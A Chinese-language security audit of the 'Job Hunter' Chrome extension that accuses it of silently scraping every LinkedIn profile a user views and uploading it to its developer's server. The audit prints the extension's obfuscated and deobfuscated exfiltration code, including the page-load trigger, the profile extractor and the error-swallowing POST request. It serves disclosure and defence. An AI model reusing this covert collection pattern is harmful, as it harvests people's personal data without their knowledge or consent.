# 「求职匠 Job Hunter」Chrome 扩展如何在你不知情的情况下上传你浏览的每一个 LinkedIn 个人资料

## JR Academy（匠人学院）Chrome 扩展安全审计：静默数据外传的技术取证

> **审计对象**：求职匠 Job Hunter v0.9.18（Chrome Web Store ID: `kbecnmcienhaopoibckmbijngmcakplf`）
>
> **开发者**：JR Academy Pty Ltd（https://jiangren.com.au），澳洲匠人学院
>
> **审计方法**：从 Chrome Web Store 下载 CRX 包，解压后对全部 JS 源码进行静态分析
>
> **审计原则**：本报告仅记录可从源代码中直接验证的事实，不做推测

---

## 摘要

**求职匠 Job Hunter** 是由 [JR Academy（匠人学院）](https://jiangren.com.au) 开发的 Chrome 浏览器扩展，声称提供 AI 求职辅助功能。然而，对其源代码的完整审计揭示了一个**隐藏的自动数据外传机制**：当安装了该扩展的用户浏览**任何** LinkedIn 个人资料页面时，扩展会在**完全无需用户操作**的情况下，自动提取该页面上的完整个人资料数据（姓名、工作经历、教育背景、技能等 15+ 个字段），并通过 HTTP POST 请求静默上传至 `api.jiangren.com.au`。

JR Academy 自身的隐私政策明确声明：

> *"We do not passively monitor your browsing activity"*（我们不会被动监控你的浏览活动）
>
> *"Content extraction occur only when you explicitly trigger them"*（内容提取仅在你主动触发时才会发生）

源代码证明事实恰恰相反。

**[English Version](README.md)** | **[繁體中文版](README.zh-TW.md)**

---

## 目录

1. [铁证：自动上传个人资料数据](#1-铁证自动上传个人资料数据)
2. [校友查询泄露浏览记录](#2-自动校友查询泄露浏览记录)
3. [隐私政策与实际行为的直接矛盾](#3-隐私政策与实际行为的直接矛盾)
4. [不安全的 Cookie 配置](#4-不安全的-cookie-配置)
5. [本报告不主张的部分](#5-本报告不主张的部分)
6. [更广泛的启示](#6-更广泛的启示)
7. [独立验证指南](#7-独立验证指南)

---

## 1. 铁证：自动上传个人资料数据

### 1.1 上传函数

Service Worker 中存在一个数据上报函数（混淆后为 `R()`），功能为将 LinkedIn 个人资料数据通过 POST 请求发送至 JR Academy 的后端服务器：

```javascript
// 反混淆后的等价逻辑
let lastReportedUrl = "";
let lastReportedTime = 0;

function reportProfileToServer(profileData) {
    if (!profileData?.name || !profileData?.profileUrl) return;

    const url = profileData.profileUrl;
    const now = Date.now();

    // 节流：相同 URL 10 秒内不重复上报
    if (url === lastReportedUrl && now - lastReportedTime < 10000) return;
    lastReportedUrl = url;
    lastReportedTime = now;

    getAuthHeaders().then(headers => {
        // 仅在用户已登录时上传
        headers.Authorization && fetch(
            "https://api.jiangren.com.au/ai-tutor/linkedin-profile",
            {
                method: "POST",
                headers: headers,
                body: JSON.stringify(profileData)  // 完整个人资料对象
            }
        ).catch(() => {})  // 静默吞掉所有错误
    }).catch(() => {})
}
```

**原始混淆代码**（可在解压后的 CRX 中搜索验证 — 文件 `assets/service-worker.ts-BSerYTM6.js`）：

```javascript
function R(e){if(!(e!=null&&e.name)||!(e!=null&&e.profileUrl))return;const t=e.profileUrl,a=Date.now();t===J&&a-j<1e4||(J=t,j=a,m().then(r=>{r.Authorization&&fetch(y("/ai-tutor/linkedin-profile"),{method:"POST",headers:r,body:JSON.stringify(e)}).catch(()=>{})}).catch(()=>{}))}
```

其中 `y()` 函数定义为：

```javascript
const me = "https://api.jiangren.com.au";
function y(e) { return `${me}${e}` }
```

### 1.2 自动触发机制

该上传函数的核心调用位于 `PAGE_TYPE_CHANGED` 消息处理器中 — 当用户浏览任何 LinkedIn 个人资料页面时**自动触发**：

```javascript
// 反混淆后的等价逻辑
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "PAGE_TYPE_CHANGED") {
        const tabId = sender.tab?.id;

        // 当页面类型为 "profile" — 延迟 3 秒后触发
        message.payload.pageType === "profile" && tabId && setTimeout(() => {
            chrome.tabs.sendMessage(tabId, { type: "EXTRACT_PROFILE_DATA" })
                .then(result => {
                    result?.profileData && reportProfileToServer(result.profileData)
                })
                .catch(() => {})
        }, 3000)

        return false;
    }
});
```

**原始混淆代码：**

```javascript
if(e.type==="PAGE_TYPE_CHANGED"){const i=(o=t.tab)==null?void 0:o.id;return i!==void 0&&(q.set(i,e.payload.pageType),chrome.runtime.sendMessage({type:"PAGE_TYPE_CHANGED",payload:e.payload}).catch(()=>{}),e.payload.pageType==="profile"&&i&&setTimeout(()=>{chrome.tabs.sendMessage(i,{type:"EXTRACT_PROFILE_DATA"}).then(l=>{l!=null&&l.profileData&&R(l.profileData)}).catch(()=>{})},3e3)),!1}
```

### 1.3 上传的数据内容

`profileData` 对象包含以下字段：

```javascript
{
    name:                "完整姓名",
    headline:            "职业头衔",
    about:               "完整的「关于」部分文本",
    location:            "所在地",
    profileUrl:          "https://www.linkedin.com/in/...",
    isOwnProfile:        true/false,
    experience:          [{ title, company, duration, description, isCurrent }],
    education:           [{ school, degree, field, years }],
    skills:              ["技能1", "技能2", ...],
    certifications:      [...],           // 专业认证
    languages:           [...],           // 语言能力
    volunteerExperience: [...],           // 志愿者经历
    profileImageUrl:     "https://...",   // 头像 URL
    connectionLevel:     "1st/2nd/3rd",   // 人脉关系级别
    connections:         "500+ connections"
}
```

这不是摘要 — 而是涵盖 **15+ 个数据字段**的完整个人资料提取。

### 1.4 完整攻击链

```
用户浏览任何 LinkedIn 个人资料页面
    |
    v
Content Script 检测到 URL 匹配 linkedin.com/in/*
    |
    v
发送 PAGE_TYPE_CHANGED { pageType: "profile" } 至 Service Worker
    |
    v
Service Worker 等待 3 秒（setTimeout 3000ms）
    |
    v
向 Content Script 发送 EXTRACT_PROFILE_DATA 指令
    |
    v
Profile Extractor 解析整个页面 DOM
    |
    v
Service Worker 收到完整的 profileData 对象
    |
    v
R() 将完整 JSON 通过 POST 发送至 https://api.jiangren.com.au/ai-tutor/linkedin-profile
    |
    v
.catch(() => {})  — 用户看不到任何东西，完全不知情
```

**整个过程中零用户交互。**

---

## 2. 自动校友查询泄露浏览记录

Service Worker 中还包含一个校友检查函数（混淆后为 `_e()`），在用户每次浏览 LinkedIn 个人资料页面时，自动向 JR Academy 后端发送被浏览者的 URL 和姓名：

```javascript
async function checkAlumni(linkedinUrl, name) {
    const params = new URLSearchParams({ linkedinUrl, name });
    const response = await fetch(
        `https://api.jiangren.com.au/ai-tutor/alumni/check?${params}`,
        { headers: authHeaders }
    );
}
```

此查询由 Content Script **自动发起，无需用户操作**。后端因此可记录每个扩展用户浏览过的所有 LinkedIn 个人资料。

---

## 3. 隐私政策与实际行为的直接矛盾

JR Academy 的隐私政策（最后更新日期 2026 年 3 月 16 日，[Wayback Machine 存档](https://web.archive.org/web/20260403061621/https://jiangren.com.au/privacy-policy)）做出了以下声明，每一条都被代码直接推翻。

### 矛盾一：「不被动监控」

| 隐私政策声明 | 代码事实 |
|-------------|---------|
| *"We do not passively monitor your browsing activity."* | `PAGE_TYPE_CHANGED` 处理器在用户仅仅浏览 LinkedIn 个人资料时就自动提取并上传数据，无需点击、无需快捷键、无需同意。 |
| *"No background data collection, automatic screenshots, or passive browsing monitoring occurs."* | 整个 `PAGE_TYPE_CHANGED` → 3 秒延迟 → `EXTRACT_PROFILE_DATA` → `R()` 链条完全在后台执行，零用户交互。 |

### 矛盾二：「仅在主动触发时提取」

| 隐私政策声明 | 代码事实 |
|-------------|---------|
| *"Our Chrome browser extensions collect additional data only when you actively use their features."* | 触发条件是 URL 模式匹配，不是用户操作。 |
| *"Content extraction occur only when you explicitly trigger them (e.g., pressing a keyboard shortcut or clicking a button)."* | 从 `PAGE_TYPE_CHANGED` 到 `R()` 的代码路径中**不存在任何用户交互检查** — 没有 `confirm()`、没有点击监听器、没有快捷键检测。 |

### 矛盾三：数据采集范围严重低报

| 隐私政策声明 | 代码事实 |
|-------------|---------|
| 数据采集范围：*"Job posting content from supported job sites; current page URL"* | 实际上传：完整姓名、头衔、简介、所在地、完整工作经历、教育背景、技能、认证、语言、志愿者经历、头像、人脉级别 — **15+ 个数据字段，全部未披露** |

### 矛盾四：第三方数据采集完全未披露

隐私政策仅描述对扩展用户本人数据的采集，**从未提及**会采集第三方 LinkedIn 用户的个人信息。

`isOwnProfile` 字段的存在证明开发者明确区分了"自己的页面"和"他人的页面"。然而上传函数 `R()` **并不检查此字段** — 所有个人资料都被一律上传。

---

## 4. 不安全的 Cookie 配置

认证 token 以 `SameSite=None` 存储，允许任何第三方网站跨站携带。用户信息以明文 JSON 编码存入 Cookie，有效期 30 天。Session Storage 访问级别被设为 `TRUSTED_AND_UNTRUSTED_CONTEXTS`，允许 Content Scripts 访问。

详见 [英文版对应章节](README.md#4-insecure-cookie-configuration) 中的完整代码。

---

## 5. 本报告不主张的部分

为维护报告公信力，以下模块经代码验证为**纯本地功能**，不存在自动回传后端的行为：

| 模块 | 是否调用后端 API？ | 结论 |
|------|-------------------|------|
| 人脉提取 + 分类 | **否** | 本地功能 |
| 消息提取 + 分类 | **否** | 本地功能 |
| 动态流扫描 | **否** | 本地功能 |
| 公司信息提取 | **否** | 本地功能 |
| 快速回复模板 | **否** | 本地功能 |
| 帖子注入 | **否** | 本地功能 |
| 职位收藏（右键菜单） | 是，但为**用户主动触发** | 合理功能 |

---

## 6. 更广泛的启示

此案例揭示了一个被低估的攻击面：**利用扩展用户作为不知情的数据采集代理节点。** 与传统爬虫不同，此模式可绕过反机器人防护、分散 IP、利用已认证 Session，且采集能力随安装量线性增长。

假设有 1,000 名活跃用户，每人每天浏览 10 个 LinkedIn 个人资料，后端每天可累积 **10,000 份完整的职业个人资料** — 零基础设施成本。

---

## 7. 独立验证指南

所有发现均可在 5 分钟内独立验证。详见 [英文版验证指南](README.md#7-reproduction-guide) 或直接运行：

```bash
curl -L -o extension.crx \
  "https://clients2.google.com/service/update2/crx?response=redirect&prodversion=131.0.0.0&acceptformat=crx2,crx3&x=id%3Dkbecnmcienhaopoibckmbijngmcakplf%26uc"
python3 extract.py extension.crx
./verify.sh source/
```

---

## 披露时间线

| 日期 | 行动 |
|------|------|
| 2026-04-03 | 源代码审计完成 |
| 2026-04-03 | 向 Google Chrome Web Store 及 LinkedIn Trust & Safety 提交举报 |
| 2026-04-03 | 公开披露 |
| 待定 | 向 JR Academy 提交正式隐私投诉（privacy@jiangren.com.au） |
| +30 天 | 向 OAIC（澳洲信息专员办公室）提出申诉 |

---

## 法律声明

本分析通过对 Chrome Web Store 公开包的静态代码审查进行。未进行动态测试、后端 API 逆向工程或任何未授权访问。CRX 文件可通过 Google 的 update API 公开下载 — 解压并分析它们是标准的安全研究实践。

---

## 仓库可用性声明

本仓库**不会**被维护者主动删除或设为私有。如果本仓库在任何时候变得无法访问，应视为受到**外部施压、法律威胁或其他不可抗力因素**所致，而非维护者主动撤回报告内容。

作者对本报告中记录的每一项技术事实负责。所有发现均可通过所附的证据和脚本独立验证。

建议读者 **Fork 本仓库**，以确保信息持续可用。

---

## 许可证

本报告以 [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) 许可发布。您可以在注明出处的前提下自由分享和改编本报告。
